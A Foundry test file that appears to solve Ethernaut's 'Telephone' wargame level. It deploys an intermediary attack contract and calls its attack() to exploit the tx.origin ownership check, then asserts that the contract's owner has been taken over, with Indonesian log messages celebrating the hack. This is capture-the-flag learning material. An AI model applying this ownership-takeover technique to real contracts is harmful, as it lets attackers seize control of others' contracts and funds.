// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/Telephone.sol";
import "../src/AttackTelephone.sol"; 

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautTelephoneTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;

    function testLevel4_Telephone() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether); 
        
        vm.startPrank(hacker, hacker); 

        console.log("Tx Origin (Hacker):", tx.origin);
        
        vm.recordLogs(); 
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        Telephone level = Telephone(levelAddr);

        console.log("Owner Awal:", level.owner());

        console.log("Mengerahkan perantara (AttackTelephone)...");
        AttackTelephone attacker = new AttackTelephone(levelAddr);

        console.log("Melakukan serangan via perantara...");
        attacker.attack();

        console.log("Owner Baru:", level.owner());

        assertEq(level.owner(), hacker);
        console.log("HACKED! Owner berhasil diambil alih.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}